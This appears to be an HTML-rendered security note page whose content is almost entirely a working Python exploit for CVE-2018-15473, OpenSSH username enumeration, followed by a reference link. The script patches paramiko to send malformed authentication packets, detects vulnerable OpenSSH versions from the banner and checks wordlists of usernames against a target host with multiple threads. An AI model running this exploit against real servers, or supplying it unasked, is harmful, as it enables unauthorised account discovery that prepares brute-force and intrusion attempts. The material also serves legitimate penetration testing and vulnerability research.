&nbsp;&nbsp;&nbsp;https://epi052.gitlab.io/notes-to-self/</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;https://gitlab.com/epi052/cve-2018-15473</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">&quot;&quot;&quot;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">import sys</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">import re</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">import socket</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">import logging</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">import argparse</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">import multiprocessing</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">from typing import Union</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">from pathlib import Path</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">import paramiko</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">assert sys.version_info &gt;= (3, 6), &quot;This program requires python3.6 or higher&quot;</span><span class="cs8926E06"><br/><br/><br/></span><span class="cs9FB05234">class Color:</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&quot;&quot;&quot; Class for coloring print statements. &nbsp;Nothing to see here, move along. &quot;&quot;&quot;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;BOLD = &#39;\033[1m&#39;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;ENDC = &#39;\033[0m&#39;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;RED = &#39;\033[38;5;196m&#39;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;BLUE = &#39;\033[38;5;75m&#39;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;GREEN = &#39;\033[38;5;149m&#39;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;YELLOW = &#39;\033[38;5;190m&#39;</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;@staticmethod</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;def string(string: str, color: str, bold: bool = False) -&gt; str:</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&quot;&quot;&quot; Prints the given string in a few different colors.</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Args:</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;string: string to be printed</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;color: &nbsp;valid colors &quot;red&quot;, &quot;blue&quot;, &quot;green&quot;, &quot;yellow&quot;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;bold: &nbsp;&nbsp;T/F to add ANSI bold code</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Returns:</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;ANSI color-coded string (str)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&quot;&quot;&quot;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;boldstr = Color.BOLD if bold else &quot;&quot;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;colorstr = getattr(Color, color.upper())</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return f&#39;{boldstr}{colorstr}{string}{Color.ENDC}&#39;</span><span class="cs8926E06"><br/><br/><br/></span><span class="cs9FB05234">class InvalidUsername(Exception):</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&quot;&quot;&quot; Raise when username not found via CVE-2018-15473. &quot;&quot;&quot;</span><span class="cs8926E06"><br/><br/><br/></span><span class="cs9FB05234">def apply_monkey_patch() -&gt; None:</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&quot;&quot;&quot; Monkey patch paramiko to send invalid SSH2_MSG_USERAUTH_REQUEST.</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;patches the following internal `AuthHandler` functions by updating the internal `_handler_table` dict</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;_parse_service_accept</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;_parse_userauth_failure</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;_handler_table = {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;MSG_SERVICE_REQUEST: _parse_service_request,</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;MSG_SERVICE_ACCEPT: _parse_service_accept,</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;MSG_USERAUTH_REQUEST: _parse_userauth_request,</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;MSG_USERAUTH_SUCCESS: _parse_userauth_success,</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;MSG_USERAUTH_FAILURE: _parse_userauth_failure,</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;MSG_USERAUTH_BANNER: _parse_userauth_banner,</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;MSG_USERAUTH_INFO_REQUEST: _parse_userauth_info_request,</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;MSG_USERAUTH_INFO_RESPONSE: _parse_userauth_info_response,</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&quot;&quot;&quot;</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;def patched_add_boolean(*args, **kwargs):</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&quot;&quot;&quot; Override correct behavior of paramiko.message.Message.add_boolean, used to produce malformed packets. &quot;&quot;&quot;</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;auth_handler = paramiko.auth_handler.AuthHandler</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;old_msg_service_accept = auth_handler._client_handler_table[paramiko.common.MSG_SERVICE_ACCEPT]</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;def patched_msg_service_accept(*args, **kwargs):</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&quot;&quot;&quot; Patches paramiko.message.Message.add_boolean to produce a malformed packet. &quot;&quot;&quot;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;old_add_boolean, paramiko.message.Message.add_boolean = paramiko.message.Message.add_boolean, patched_add_boolean</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;retval = old_msg_service_accept(*args, **kwargs)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;paramiko.message.Message.add_boolean = old_add_boolean</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return retval</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;def patched_userauth_failure(*args, **kwargs):</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&quot;&quot;&quot; Called during authentication when a username is not found. &quot;&quot;&quot;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;raise InvalidUsername(*args, **kwargs)</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;auth_handler._client_handler_table.update({</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;paramiko.common.MSG_SERVICE_ACCEPT: patched_msg_service_accept,</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;paramiko.common.MSG_USERAUTH_FAILURE: patched_userauth_failure</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;})</span><span class="cs8926E06"><br/><br/><br/></span><span class="cs9FB05234">def create_socket(hostname: str, port: int) -&gt; Union[socket.socket, None]:</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&quot;&quot;&quot; Small helper to stay DRY.</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;Returns:</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;socket.socket or None</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&quot;&quot;&quot;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;# spoiler alert, I don&#39;t care about the -6 flag, it&#39;s really</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;# just to advertise in the help that the program can handle ipv6</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;try:</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return socket.create_connection((hostname, port))</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;except socket.error as e:</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;print(f&#39;socket error: {e}&#39;, file=sys.stdout)</span><span class="cs8926E06"><br/><br/><br/></span><span class="cs9FB05234">def connect(username: str, hostname: str, port: int, verbose: bool = False, **kwargs) -&gt; None:</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&quot;&quot;&quot; Connect and attempt keybased auth, result interpreted to determine valid username.</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;Args:</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;username: &nbsp;&nbsp;username to check against the ssh service</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;hostname: &nbsp;&nbsp;hostname/IP of target</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;port: &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;port where ssh is listening</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;key: &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;key used for auth</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;verbose: &nbsp;&nbsp;&nbsp;bool value; determines whether to print &#39;not found&#39; lines or not</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;Returns:</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;None</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&quot;&quot;&quot;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;sock = create_socket(hostname, port)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;if not sock:</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;transport = paramiko.transport.Transport(sock)</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;try:</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;transport.start_client()</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;except paramiko.ssh_exception.SSHException:</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return print(Color.string(f&#39;[!] SSH negotiation failed for user {username}.&#39;, color=&#39;red&#39;))</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;try:</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;transport.auth_publickey(username, paramiko.RSAKey.generate(1024))</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;except paramiko.ssh_exception.AuthenticationException:</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;print(f&quot;[+] {Color.string(username, color=&#39;yellow&#39;)} found!&quot;)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;except InvalidUsername:</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if not verbose:</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;print(f&#39;[-] {Color.string(username, color=&quot;red&quot;)} not found&#39;)</span><span class="cs8926E06"><br/><br/><br/></span><span class="cs9FB05234">def main(**kwargs):</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&quot;&quot;&quot; main entry point for the program &quot;&quot;&quot;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;sock = create_socket(kwargs.get(&#39;hostname&#39;), kwargs.get(&#39;port&#39;))</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;if not sock:</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;banner = sock.recv(1024).decode()</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;regex = re.search(r&#39;-OpenSSH_(?P&lt;version&gt;\d\.\d)&#39;, banner)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;if regex:</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;try:</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;version = float(regex.group(&#39;version&#39;))</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;except ValueError:</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;print(f&#39;[!] Attempted OpenSSH version detection; version not recognized.\n[!] Found: {regex.group(&quot;version&quot;)}&#39;)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;else:</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;ver_clr = &#39;green&#39; if version &lt;= 7.7 else &#39;red&#39;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;print(f&quot;[+] {Color.string(&#39;OpenSSH&#39;, color=ver_clr)} version {Color.string(version, color=ver_clr)} found&quot;)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;else:</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;print(f&#39;[!] Attempted OpenSSH version detection; version not recognized.\n[!] Found: {Color.string(banner, color=&quot;yellow&quot;)}&#39;) &nbsp;&nbsp;&nbsp;</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;apply_monkey_patch()</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;if kwargs.get(&#39;username&#39;):</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;kwargs[&#39;username&#39;] = kwargs.get(&#39;username&#39;).strip()</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return connect(**kwargs)</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;with multiprocessing.Pool(kwargs.get(&#39;threads&#39;)) as pool, Path(kwargs.get(&#39;wordlist&#39;)).open() as usernames:</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;host = kwargs.get(&#39;hostname&#39;)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;port = kwargs.get(&#39;port&#39;)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;verbose = kwargs.get(&#39;verbose&#39;)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;pool.starmap(connect, [(user.strip(), host, port, verbose) for user in usernames])</span><span class="cs8926E06"><br/><br/><br/></span><span class="cs9FB05234">if __name__ == &#39;__main__&#39;:</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;parser = argparse.ArgumentParser(description=&quot;OpenSSH Username Enumeration (CVE-2018-15473)&quot;)</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;parser.add_argument(&#39;hostname&#39;, help=&#39;target to enumerate&#39;, type=str)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;parser.add_argument(&#39;-p&#39;, &#39;--port&#39;, help=&#39;ssh port (default: 22)&#39;, default=22, type=int)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;parser.add_argument(&#39;-t&#39;, &#39;--threads&#39;, help=&quot;number of threads (default: 4)&quot;, default=4, type=int)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;parser.add_argument(&#39;-v&#39;, &#39;--verbose&#39;, action=&#39;store_true&#39;, default=False,</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;help=&quot;print both valid and invalid usernames (default: False)&quot;)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;parser.add_argument(&#39;-6&#39;, &#39;--ipv6&#39;, action=&#39;store_true&#39;, help=&quot;Specify use of an ipv6 address (default: ipv4)&quot;)</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;multi_or_single_group = parser.add_mutually_exclusive_group(required=True)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;multi_or_single_group.add_argument(&#39;-w&#39;, &#39;--wordlist&#39;, type=str, help=&quot;path to wordlist&quot;)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;multi_or_single_group.add_argument(&#39;-u&#39;, &#39;--username&#39;, help=&#39;a single username to test&#39;, type=str)</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;args = parser.parse_args()</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;logging.getLogger(&#39;paramiko.transport&#39;).addHandler(logging.NullHandler())</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;main(**vars(args))</span></p><h2 class="cs868C439D">
			<a name="参考链接"><span class="cs83F14626">参考链接</span></a></h2>
		<p class="cs6FD73CFB"><span class="cs8926E06">https://www.freebuf.com/vuls/184583.html</span></p></body>
</html>
